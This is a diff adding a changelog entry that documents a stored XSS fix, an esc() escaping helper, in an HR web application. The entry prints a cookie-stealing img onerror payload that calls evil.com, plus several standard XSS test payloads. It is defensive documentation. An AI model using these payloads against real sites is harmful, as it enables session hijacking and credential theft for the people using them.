@@ -6,6 +6,62 @@ Format follows [Keep a Changelog](https://keepachangelog.com/en/1.1.0/) · Versi
 
 ---
 
+## [1.4.30] — 2026-07-02
+
+**Day 2 — C2 (CRITICAL): XSS Protection via `esc()` helper**
+
+### Vulnerability
+User-input fields (firstName, lastName, department, reason, message, etc.) were rendered directly into innerHTML/template literals without HTML escaping.
+
+An attacker (any employee with edit access to their own profile, or admin editing any profile) could inject:
+```
+firstName: <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
+```
+
+Every subsequent page render of that employee's name would execute the payload — cookie theft, session hijack, silent Supabase writes, keylogger installation.
+
+### Fix
+1. Added utility `esc(str)` function (6-char HTML escape: `& < > " ' /`)
+2. Wrapped **246 template literal fields** across 14 field types:
+ - `firstName` × 70 · `lastName` × 62 · `attachmentName` × 19
+ - `reason` × 15 · `position` × 10 · `department` × 10
+ - `message` × 8 · `title` × 5 · `purpose` × 5
+ - `name` × 6 · `employeeName` × 4 · `location` × 2
+ - `approverNote` × 1 · `description` × 1
+3. Handled edge cases: ternary concatenation (`mgr ? mgr.firstName + ' ' + mgr.lastName : '-'`), IIFE patterns, parenthesized expressions
+4. Post-audit hotfix: added 4 more escapes on payslip company info (`info.logo`, `info.address`, `info.phone`, `info.taxId`) — admin-editable fields also XSS-vulnerable
+5. Final: **277 `esc()` call sites**, main script syntax check clean
+
+### Confirmed SAFE (audit false-positives, no fix needed)
+- `s.text` in `getStatusBadge()` — hardcoded map constants, not user input
+- `a.text` in Recent Activity feed — contains intentional HTML from `getStatusBadge()`; wrapping would break badge display; source values are enum keys only
+
+### Attack Surface Eliminated
+- Stored XSS via employee profile fields
+- Reflected XSS via search/filter text
+- Persistence XSS via leave requests (`reason`, `purpose`) and audit messages
+- Filename XSS via `attachmentName` in leave attachments
+
+### Test Payloads (all now rendered as text, not executed)
+```
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+javascript:alert(1)
+```
+
+### Backward Compatibility
+✅ Zero DB migration — pure client-side render change
+✅ Existing data displays identically (already-safe strings render same)
+✅ No performance impact (String.replace × 6 per render, negligible)
+
+### Deployment
+- v1.4.29 → v1.4.30
+- File size: 10,144 → 10,158 lines (+14 lines for `esc()` + comments)
+- Backup: Layer 1 Supabase manual · Layer 2 localStorage JSON · Layer 3 Fingerprint SHA-256 · Layer 4 `git tag v1.4.29-pre-xss-backup`
+
+---
+
 ## [1.4.29] — 2026-07-03
 
 **Day 1 HOTFIX — C1: Wire migration into startup (v1.4.28 had function but no call)**
